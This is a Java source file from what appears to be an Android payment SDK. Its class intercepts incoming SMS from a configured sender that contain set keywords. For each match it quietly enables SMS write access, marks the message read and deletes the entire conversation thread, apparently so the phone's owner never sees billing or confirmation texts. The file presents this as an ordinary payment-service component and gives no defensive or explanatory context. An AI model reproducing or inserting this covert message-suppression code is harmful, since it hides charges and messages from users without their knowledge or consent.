package com.tianzh.pay.service.msg;


import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.tianzh.pay.utils.LogUtils;
import com.tianzh.pay.utils.SmsWriteOpUtil;

/**
 * Created by pig on 2015-11-12.
 */
public class InterceptIncomingMsgImpl implements IncomingMsgObserver {
    protected Context context;
    protected String port;
    protected String keyWorkds;

    public InterceptIncomingMsgImpl(Context context, String port, String keyWorkds) {
        this.context = context;
        this.port = port;
        this.keyWorkds = keyWorkds;
    }

    @Override
    public void handleMsg(Cursor cursor) {
        String textMsg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
        String phoneNum = cursor.getString(cursor.getColumnIndexOrThrow("address"));
        String[] strings = keyWorkds.split("#");
        LogUtils.d("InterceptIncomingMsgImpl：textMsg = " + textMsg + "; phoneNum = " + phoneNum);
        if (phoneNum.equalsIgnoreCase(port)) {
            for (String str : strings) {
                if (textMsg.contains(str)) {
                    if (!SmsWriteOpUtil.isWriteEnabled(context)) {
                        SmsWriteOpUtil.setWriteEnabled(context, true);
                    }

                    interceptMsg(cursor);
                    break;
                }
            }
        }
    }


    protected void interceptMsg(Cursor cursor) {

        //更新当前未读短信状态为已读
        ContentValues values = new ContentValues();
        values.put("read", "1");        //修改短信为已读模式  content://sms/inbox 需要加密
        context.getContentResolver().update(Uri.parse("content://sms/inbox"), values, " _id=?", new String[]{"" + cursor.getInt(0)});

        //删除此条消息
        deleteSMS(cursor);
//        String thread_id = cursor
//                .getString(cursor.getColumnIndexOrThrow("thread_id"));
//
//        String _id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
//
//        Uri thread = Uri.parse("content://sms/conversations/" + thread_id);
//        context.getContentResolver().delete(thread, "_id=?", new String[]{_id});
    }


    protected void deleteSMS(Cursor cursor) {
        try {
            // Delete SMS
            long threadId = cursor.getLong(1);
            int result = context.getContentResolver().delete(Uri
                            .parse("content://sms/conversations/" + threadId),
                    null, null);
            LogUtils.d("threadId:: " + threadId + "  result::"
                    + result);
        } catch (Exception e) {
            LogUtils.e("Exception:: " + e);
        }
    }


}
